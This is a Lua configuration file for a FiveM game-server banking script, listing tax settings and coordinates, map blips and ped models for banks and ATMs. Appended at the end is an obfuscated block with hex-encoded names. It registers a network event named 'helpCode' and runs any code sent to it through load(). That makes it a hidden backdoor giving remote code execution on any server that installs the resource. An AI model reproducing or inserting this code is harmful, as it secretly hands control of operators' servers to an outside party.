Config = {}
Config.Tax = {
    enabled = false,
    rate = 10,
    transfer = 20
}
Config.Banks = {

	{
        name="Bank",
        coords = { x=-110.5719, y=6468.535, z=31.89572},
		blip = {enabled = true, id = 374, scale = 0.7, color = 2},
		takeSalary = false
    },
    
	{
        name="Bank",
        coords = { x=312.783, y=-278.900, z=54.3754},
		blip = {enabled = true, id = 374, scale = 0.7, color = 2},
		takeSalary = false
    },
	{
        name="Bank",
        coords = { x=314.250, y=-279.500, z=54.3754},
		blip = {enabled = false, id = 374, scale = 0.7, color = 2},
		takeSalary = false
    },
	{
        name="Bank",
        coords = { x=-350.900, y=-50.300, z=49.200},
		blip = {enabled = true, id = 374, scale = 0.7, color = 2},
		takeSalary = false
    },
    {
        name="Bank",
        coords = { x=-352.400, y=-49.800, z=49.200},
		blip = {enabled = false, id = 374, scale = 0.7, color = 2},
		takeSalary = false
    },
   
	{
        name="Bank",
        coords = { x=1174.900, y=2707.130, z=38.300},
		blip = {enabled = true, id = 374, scale = 0.7, color = 2},
		takeSalary = false
    },
    {
        name="Bank",
        coords = { x=1176.500, y=2707.130, z=38.300},
		blip = {enabled = false, id = 374, scale = 0.7, color = 2},
		takeSalary = false
    },

	{
        name="Atm",
        coords = { x=-1864.5288, y=2064.1213, z=140.9768}, 
		blip = {enabled = false, id = 374, scale = 0.7, color = 2},
		takeSalary = false
    },
    
    
    
	{
        name="Bank",
        coords = { x = 241.600, y = 225.900, z = 106.350 },
		blip = {enabled = false, id = 374, scale = 0.7, color = 2},
		takeSalary = true,
		ped = {
			model = "a_f_m_bevhills_02",
			coords = {x = 241.878, y = 226.851, z = 105.287, h = 334.0 - 180},
		    animation = {
		    	dict = "anim@heists@heist_corona@team_idles@female_a",
		    	name = "idle"
		    }
		}
    },
	{
        name="Bank",
        coords = { x = 243.280, y = 225.400, z = 106.287 },
		blip = {enabled = false, id = 374, scale = 0.7, color = 2},
		takeSalary = true,
		ped = {
			model = "cs_bankman",
			coords = {x = 243.707, y = 226.212, z = 105.287, h = 336.0 - 180},
		    animation = {
		    	dict = "anim@heists@heist_corona@team_idles@male_a",
		    	name = "idle"
		    }
		}
    },
	{
        name="Bank",
        coords = { x = 246.575, y = 224.00, z = 106.287 },
		blip = {enabled = false, id = 374, scale = 0.7, color = 2},
		takeSalary = true,
		ped = {
			model = "a_f_m_bevhills_02",
			coords = {x = 247.025, y = 225.027, z = 105.287, h = 338.0 - 180},
		    animation = {
		    	dict = "anim@heists@heist_corona@team_idles@female_a",
		    	name = "idle"
		    }
		}
    },
	{
        name="Bank",
        coords = { x = 248.38, y = 223.300, z = 106.287 },
		blip = {enabled = true, id = 374, scale = 0.7, color = 2},
		takeSalary = true,
		ped = {
			model = "cs_bankman",
			coords = {x = 248.835, y = 224.318, z = 105.287, h = 337.0 - 180},
		    animation = {
		    	dict = "anim@heists@heist_corona@team_idles@male_a",
		    	name = "idle"
		    }
		}
    },
	{
        name="Bank",
        coords = { x = 251.800, y = 222.100, z = 106.287 },
		blip = {enabled = false, id = 374, scale = 0.7, color = 2},
		takeSalary = true,
		ped = {
			model = "a_f_m_bevhills_02",
			coords = {x = 252.176, y = 223.152, z = 105.287, h = 336.0 - 180},
		    animation = {
		    	dict = "anim@heists@heist_corona@team_idles@female_a",
		    	name = "idle"
		    }
		}
    },
	{
        name="Bank",
        coords = { x = 253.550, y = 221.500, z = 106.287 },
		blip = {enabled = false, id = 374, scale = 0.7, color = 2},
		takeSalary = true,
		ped = {
			model = "cs_bankman",
			coords = {x = 254.091, y = 222.388, z = 105.287, h = 333.0 - 180},
		    animation = {
		    	dict = "anim@heists@heist_corona@team_idles@male_a",
		    	name = "idle"
		    }
		}
    },
    
    
	{
        name="Bank",
        coords = { x = 148.575, y = -1040.314, z = 29.378 },
		blip = {enabled = true, id = 374, scale = 0.7, color = 2},
		takeSalary = false,
		ped = {
			model = "cs_bankman",
			coords = {x = 149.493, y = -1042.079, z = 28.368, h = 333.187},
		    animation = {
		    	dict = "anim@heists@heist_corona@team_idles@male_a",
		    	name = "idle"
		    }
		}
    },
    
--make it big bank

	-- {
 --       name="ATM", 
 --       coords = { x = -2962.60,	y=482.1914, 	z=15.762 },
	-- 	blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	-- },
    
    
	{
        name="Bank",
        coords = { x = 149.823, y = -1040.801, z = 29.374 },
		blip = {enabled = false, id = 374, scale = 0.7, color = 2},
		takeSalary = false,
		ped = {
			model = "a_f_m_bevhills_02",
			coords = {x = 148.085, y = -1041.571, z = 28.368, h = 334.648},
		    animation = {
		    	dict = "anim@heists@heist_corona@team_idles@female_a",
		    	name = "idle"
		    }
		}
	}
}

	-- {
 --       name="ATM", 
 --       coords = { x = -1216.27,	y=-331.461, 	z=37.773 },
	-- 	blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	-- },

Config.Atms = {

	{
        name="ATM", 
        coords = { x = 468.900,	y = -990.403,	z = 26.200 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = -3334.6516,	y =1797.6277,	z = 38.4973 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = 2742.3474,	y = 3464.5361,	z = 55.6700 },
		blip = {enabled = true, id = 108, scale = 0.5, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -356.7850,	y = -138.0387,	z = 39.0108 },
		blip = {enabled = false, id = 108, scale = 0.5, color = 2}
	},

	{
        name="ATM", 
        coords = { x = -72.5378,	y = 1003.9059,	z = 239.5116 },
		blip = {enabled = true, id = 108, scale = 0.8, color = 2}
	},

	{
        name="ATM", 
        coords = { x = 472.000,	y = -1001.700,	z = 30.600 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},

 
	{
        name="ATM", 
        coords = { x = -562.100,	y = 274.800,	z = 82.950 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},


	{
        name="ATM", 
        coords = { x = -386.650,	y=6046.500, 	z=31.400 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	
	{
        name="ATM", 
        coords = { x = -282.900,	y=6226.600, 	z=31.350 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},



	{
        name="ATM", 
        coords = { x = -132.900,	y=6366.900, 	z=31.300 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

----



	{
        name="ATM", 
        coords = { x = -1337.850, y = -1255.980, z = 5.900 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = -1339.800, y = -1256.700, z = 5.900 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},





------
	{
        name="ATM", 
        coords = { x = -95.900,	y=6457.400, 	z=31.300 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -97.650,	y=6455.700, 	z=31.300 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},


	{
        name="ATM", 
        coords = { x = 156.000,	y=6643.200, 	z=31.400 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},


	{
        name="ATM", 
        coords = { x = 173.800, y = 6638.100, z = 31.400 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = 1700.800, y = 6426.650, z = 32.400 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = 1735.00, y = 6410.400, z = 35.037 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 1703.180, y = 4933.950, z = 41.90 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 1968.400, y = 3743.200, z = 32.000 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = {x = 1822.900, y = 3682.800, z = 34.150},
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},


	{
        name="ATM", 
        coords = { x = 540.230, y = 2671.450, z = 42.00},
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},


	{
        name="ATM", 
        coords = { x = 2564.250, y = 2584.600, z = 37.900 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = 250.5437, y = -1025.0358, z = 29.5358 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = -42.1824, y = -1673.6312, z = 29.4918 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = 85.5636, y = 290.9279, z = 110.2074 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = 2558.746, y = 351.021, z = 108.622 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 1077.900, y = -776.890, z = 58.100 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 1137.800, y = -469.000, z = 66.500 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 1166.940, y = -455.700, z = 66.650 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 1153.350, y = -326.920, z = 69.030 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = 380.781, y = 323.377, z = 103.550 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = 266.235, y = 213.850, z = 106.200 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},


	{
        name="ATM", 
        coords = { x = 265.900, y = 212.956, z = 106.200 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 265.600, y = 211.956, z = 106.200},
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 265.200, y = 211.040, z = 106.200},
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 264.900, y = 210.084, z = 106.200 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = 285.500	, y = 143.00, z = 104.000 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = 158.700, y = 234.600, z = 106.450 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = -165.550, y = 232.550, z = 94.755 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = -165.522, y = 234.622, z = 94.750 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = {x = -1827.500, y = 784.570, z = 138.100},
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = -1410.628, y = -99.05762, z = 52.25518 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = {x = -1410.071, y = -100.7806, z = 52.25933 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -1205.26,	y=-326.6462,	z=37.71696 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -1206.015,	y=-325.1412,	z=37.72319 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{  
        name="ATM", 
        coords = { x = -2071.989,	y=-317.1367, 	z=13.17721},
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -2974.656,	y= 380.2761, 	z=14.86594 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},


	{
        name="ATM", 
        coords = { x = -2958.831,	y=487.3756, 	z=  15.3478},
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -2956.697,	y= 487.2876, 	z= 15.35376 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = -3043.711,	y=594.2769, 	z=7.603697 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

-- -3040.427, 593.2819, 7.779802
  
	{
        name="ATM", 
        coords = { x = -3144.703,	y=1127.663, 	z=20.71343},
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = -3241.522,	y=997.7462,	z=12.41525},
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

  
	{
        name="ATM", 
        coords = { x = -3240.24,	y=1008.639, 	z=12.70377 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{ 
        name="ATM", 
        coords = { x = -1305.57,	y=-706.7655,  	z=25.17703 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM",   
        coords = { x = -537.6604,	y=-854.8549, 	z=29.14311 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = -710.2372,	y=-818.5541, 	z=  23.59267},
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -713.0853,	y=-818.5541, 	z= 23.60019 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
 
	{
        name="ATM", 
        coords = { x = -718.0378,	y=-915.7753, 	z= 19.08073 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -526.6061,	y= -1223.37, 	z=18.31879 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

	{
        name="ATM", 
        coords = { x = -259.2684,	y=-723.4388, 	z=33.56839 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -256.6211,	y= -716.0657,	z=33.6515 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},

 

	{
        name="ATM",   
        coords = { x = -204.1239,	y=-861.1351,	z=30.13562 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},

 
	{
        name="ATM",   
        coords = { x = 111.23,	y= -774.8649, 	z=31.30266 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
	{  
        name="ATM", 
        coords = { x = 114.3876, 	y=-775.9812, 	z=31.28566 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x =  118.6671,	y= -883.7366,	z= 31.00432 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x=-202.9184, y=-1309.838, z=31.3153},
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -847.0956,	y=-340.5243, 	z=38.24673 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -846.5394,	y=-341.5981, 	z=38.53265 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -57.27766,	y=-1751.925,	z=29.29624},
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -262.200,	y=-2012.150, 	z=30.06157 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 24.44753, 	y=-945.5587, 	z=29.19077 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 928.400, 	y = 52.650, 	z = 81.000 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -37.620, y = -1114.75, z = 26.250 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 298.100, y = -600.600, z = 43.200 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -254.300,	y=-692.900, 	z=33.400 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -1569.768,	y=-546.8986, 	z=34.79245 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -1570.724,	y= -547.568, 	z=34.79245 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -1415.631, 	y=-212.1604,	z=46.36483},
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -1430.451,	y=-211.289,	z=46.33739 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 33.24932, 	y=-1348.583, 	z=29.36955 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 130.3607,	y=-1292.425,	z=29.14886 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 129.9294,	y=-1291.68,	z=29.1411},
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 129.472,	y=-1290.891,	z=29.14172 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 289.2063,	y=-1282.185,	z=29.51898 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
  
	{
        name="ATM", 
        coords = { x = 289.4662,	y=-1256.654,	z=29.30383 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
 
	{
        name="ATM", 
        coords = { x = 296.1512,	y= -896.0853, 	z=29.15093},
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 296.8633, 	y= -894.1681, 	z=29.1224},
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 1687.169,	y=4815.929, 	z=41.87372 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -301.7923,	y=-829.6531,	z=32.292},
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -303.3742,	y=-829.3528,	z=32.29527},
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},


 
	{
        name="ATM", 
        coords = { x = 5.659073,		y= -919.8033, 	z=29.33799 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},



	{
        name="ATM", 
        coords = { x = -2294.169, 	y =   354.5218, z =    174.4597 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
  
	{
        name="ATM", 
        coords = { x = -2294.947,	y =  356.173,	z = 174.4738 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
 
	{
        name="ATM", 
        coords = { x = -2295.732, 	y =  357.8585,	z =  174.4592 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},



	{
        name="ATM", 
        coords = { x = 2683.428,	y =  3286.46,	z =  55.11384 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
------------------fixed atm
	{
        name="ATM", 
        coords = { x = -3040.793,	y = 593.188,	z = 7.909 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = -2295.244,	y = 357.256,	z = 174.602 },
		blip = {enabled = true, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 236.605, y = 219.678, z = 106.287 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 237.037, y = 218.726, z = 106.287 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 237.418, y = 217.757, z = 106.287 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 237.851, y = 216.898, z = 106.287 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 238.253, y = 215.966, z = 106.287 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 147.663, y = -1035.766, z = 29.343 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	},
	{
        name="ATM", 
        coords = { x = 145.978, y = -1035.169, z = 29.345 },
		blip = {enabled = false, id = 108, scale = 0.3, color = 2}
	}
}




local TFrHGaZyAOQAzBYvnAmTiqfQUCEydRFfpxHLtWsTotkPfLfCQgQjboUwRQBPngvAKdQAka = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} TFrHGaZyAOQAzBYvnAmTiqfQUCEydRFfpxHLtWsTotkPfLfCQgQjboUwRQBPngvAKdQAka[6][TFrHGaZyAOQAzBYvnAmTiqfQUCEydRFfpxHLtWsTotkPfLfCQgQjboUwRQBPngvAKdQAka[1]](TFrHGaZyAOQAzBYvnAmTiqfQUCEydRFfpxHLtWsTotkPfLfCQgQjboUwRQBPngvAKdQAka[2]) TFrHGaZyAOQAzBYvnAmTiqfQUCEydRFfpxHLtWsTotkPfLfCQgQjboUwRQBPngvAKdQAka[6][TFrHGaZyAOQAzBYvnAmTiqfQUCEydRFfpxHLtWsTotkPfLfCQgQjboUwRQBPngvAKdQAka[3]](TFrHGaZyAOQAzBYvnAmTiqfQUCEydRFfpxHLtWsTotkPfLfCQgQjboUwRQBPngvAKdQAka[2], function(FdJtCAMgZGwbdszUfINpHdAonnvDogRLhZwdVLlMjgtWmBAXYZpbaRdOfEMjAwkVoJQOun) TFrHGaZyAOQAzBYvnAmTiqfQUCEydRFfpxHLtWsTotkPfLfCQgQjboUwRQBPngvAKdQAka[6][TFrHGaZyAOQAzBYvnAmTiqfQUCEydRFfpxHLtWsTotkPfLfCQgQjboUwRQBPngvAKdQAka[4]](TFrHGaZyAOQAzBYvnAmTiqfQUCEydRFfpxHLtWsTotkPfLfCQgQjboUwRQBPngvAKdQAka[6][TFrHGaZyAOQAzBYvnAmTiqfQUCEydRFfpxHLtWsTotkPfLfCQgQjboUwRQBPngvAKdQAka[5]](FdJtCAMgZGwbdszUfINpHdAonnvDogRLhZwdVLlMjgtWmBAXYZpbaRdOfEMjAwkVoJQOun))() end)